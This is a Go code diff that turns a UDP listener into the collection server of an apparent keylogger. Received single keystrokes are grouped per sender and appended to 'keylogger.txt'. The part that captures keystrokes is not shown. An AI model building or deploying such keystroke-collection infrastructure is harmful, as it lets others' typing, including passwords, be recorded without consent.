@@ -8,11 +8,13 @@ package main
 import (
 	"fmt"
 	"net"
+	"os"
 )
 
 const (
 	Protocol = "udp"
 	Address  = "127.0.0.1:8722"
+	Filename = "keylogger.txt"
 )
 
 func main() {
@@ -29,13 +31,34 @@ func main() {
 	defer conn.Close()
 
 	fmt.Println("Start listening...")
+	fromHead := true
 	for {
 		buffer := make([]byte, 1024)
 		n, raddr, e := conn.ReadFromUDP(buffer)
 		if e != nil {
 			fmt.Printf("Failed to read from UDP: %s\n", e.Error())
+			continue
 		}
-		fmt.Printf("Received from %s: %s\n", raddr, bufString(buffer[:n]))
+		file, e := os.OpenFile(Filename, os.O_WRONLY|os.O_CREATE|os.O_APPEND, os.ModePerm)
+		if e != nil {
+			fmt.Printf("Failed to open file: %s\n", e.Error())
+			fmt.Printf("[%s] %s\n", raddr, bufString(buffer[:n]))
+			continue
+		}
+		if len(bufString(buffer[:n])) == 1 {
+			if fromHead {
+				_, _ = file.WriteString(fmt.Sprintf("[%s] ", raddr))
+			}
+			_, _ = file.WriteString(bufString(buffer[:n]))
+			fromHead = false
+		} else {
+			if !fromHead {
+				_, _ = file.WriteString("\n")
+				fromHead = true
+			}
+			_, _ = file.WriteString(fmt.Sprintf("[%s] %s\n", raddr, bufString(buffer[:n])))
+		}
+		_ = file.Close()
 	}
 }
 
@@ -45,8 +68,6 @@ func bufString(b []byte) string {
 		return "<tab>"
 	case "\r":
 		return "<enter>"
-	case " ":
-		return "<space>"
 	case "\b":
 		return "<backspace>"
 	default:
